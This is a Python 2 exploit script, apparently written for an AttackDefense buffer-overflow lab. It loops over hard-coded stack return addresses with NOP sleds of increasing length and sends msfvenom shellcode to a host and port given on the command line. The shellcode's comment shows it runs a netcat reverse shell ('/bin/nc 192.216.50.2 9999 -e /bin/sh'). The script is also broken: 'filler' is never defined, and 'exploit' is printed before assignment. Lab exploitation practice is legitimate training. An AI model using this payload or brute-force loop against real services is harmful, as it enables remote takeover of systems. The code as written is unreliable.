#!/usr/bin/env python
###############
# Ref: https://public.attackdefense.com/listing?labtype=exploit-research&subtype=exploit-research-buffer-overflow (Remote Service)
# I got lazy and did this to find a NOP sled
##############
import socket
import sys
import struct  
import time 

_AUTHOR_ = "Tyler Boykin"

def p(x):
	return struct.pack('<I',x)  
  
jmps = (
    0xffffca50, 0xffffcaa0, 0xffffcb50, 0xffffcba0, 
    0xffffcc50, 0xffffcca0, 0xffffcd50, 0xffffcda0, 
    0xffffce50, 0xffffcea0, 0xffffcf50, 0xffffcfa0, 
    0xffffda50, 0xffffdaa0, 0xffffdb50, 0xffffdba0, 
    0xffffdc50, 0xffffdca0, 0xffffdd50, 0xffffdda0, 
    0xffffde50, 0xffffdea0, 0xffffdf50, 0xffffdfa0, 
    0xfffffa50, 0xfffffaa0, 0xfffffb50, 0xfffffba0, 
    0xfffffc50, 0xfffffca0, 0xfffffd50, 0xfffffda0, 
    0xfffffe50, 0xfffffea0, 0xffffff50, 0xffffffa0, 
    0xffffd0ff, 0xffffd1ff, 0xffffd2ff, 0xffffd3ff, 
    0xffffd4ff, 0xffffd5ff, 0xffffd6ff, 0xffffd7ff, 
    0xffffd8ff, 0xffffd9ff, 0xffffdaff, 0xffffdbff, 
    0xffffdcff, 0xffffddff, 0xffffdeff, 0xffffdfff
	)
  
# msfvenom -p linux/x86/exec CMD='/bin/nc 192.216.50.2 9999 -e /bin/sh' -b'\x00\x20\x0a\x0d' -f python
buf =  ""
buf += "\xb8\x9b\xc8\x53\x11\xda\xc7\xd9\x74\x24\xf4\x5b\x31"
buf += "\xc9\xb1\x13\x31\x43\x12\x83\xc3\x04\x03\xd8\xc6\xb1"
buf += "\xe4\xb4\xdd\x6d\x9e\x1a\x84\xe5\x8d\xf9\xc1\x11\xa5"
buf += "\xd2\xa2\xb5\x36\x44\x6a\x24\x5e\xfa\xfd\x4b\xf2\xea"
buf += "\xdb\x8b\xf3\xea\x0c\xee\x9a\x84\x7d\x80\x3f\x78\xb3"
buf += "\x65\xf2\x56\x81\xa4\xc4\x88\xd0\xf6\x06\xe6\x3a\xce"
buf += "\x6f\x3f\x02\x10\xbd\x5a\x54\x7f\xdf\xcd\xfa\x50\x6c"
buf += "\x65\x03\xf8\xc1\xfc\xe2\xcb\x66"

if(len(sys.argv) == 1):
    print(exploit)
    sys.exit()
elif (len(sys.argv) == 3):
    for jmp in jmps:
        for i in range(4,2000,400):
            exploit = ''
            exploit += filler
            exploit += p(jmp)
            exploit += '\x90' * i
            exploit += buf

            print("[*] Trying 0x%x with %d NOPs" % (jmp,i))
            RHOST = sys.argv[1]
            RPORT = int(sys.argv[2])
            conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            conn.connect((RHOST,RPORT))
            conn.recv(1024)
            conn.send(exploit)
            conn.close()
            time.sleep(1)
